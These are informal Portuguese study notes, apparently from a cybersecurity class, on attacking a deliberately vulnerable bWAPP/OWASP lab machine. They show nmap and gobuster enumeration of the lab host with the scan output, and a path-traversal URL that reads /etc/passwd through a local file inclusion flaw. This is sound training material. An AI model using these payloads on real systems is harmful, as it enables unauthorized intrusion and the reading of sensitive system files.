# cyber_sos

cp3
burble
hydra
chaves privadas e publicas
netcat?
printf?

nmap -sV 192.168.56.102 (servidor do owasp)
# lista vulnerabilidades do servidor, usar lista do thiago para testar as vulnerabilidaderqwiorj
https://tiagoalcan.notion.site/Cybersecurity-FOR-DEV-197d7765e27380d98603e484416d4a49?source=copy_link



RFI/LFI ataque de colocar arquivo dentro da host serve pra entrar na host e abrir portas etc
Colocamos um arquivo no parametro da requisição
o comando gobuster olha tudo que tem de importante no servidor

cd /usr/share/wordlists/dirb                           —acessar essa pasta
gobuster dir -u 192.168.56.102/assets/ -w big.txt

listando arquivos dentro da host:

Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 218]
/.htaccess            (Status: 403) [Size: 218]
/.svn                 (Status: 403) [Size: 213]
/1                    (Status: 200) [Size: 72580]
/2                    (Status: 200) [Size: 91665]
/4                    (Status: 200) [Size: 24700]
/3                    (Status: 200) [Size: 117977]
/alpha                (Status: 200) [Size: 3271]
/application          (Status: 200) [Size: 50419]
/clear                (Status: 200) [Size: 509]
/company              (Status: 200) [Size: 1191]
/email                (Status: 200) [Size: 1511]
/fonts                (Status: 301) [Size: 243] [--> http://192.168.56.102/assets/fonts/]                                                                 
/key                  (Status: 200) [Size: 1259]
/loading              (Status: 200) [Size: 1849]
/logo                 (Status: 200) [Size: 3028]
/profile              (Status: 200) [Size: 5015]
/sorting              (Status: 200) [Size: 1121]
Progress: 20469 / 20469 (100.00%)

link do acesso:
http://192.168.56.102/bWAPP/rlfi.php?language=/../../etc/passwd

rlfi.php é o arquivo dentro do owasp para testarmos a invasão... ai sempre usamos o language e testamos o passwd

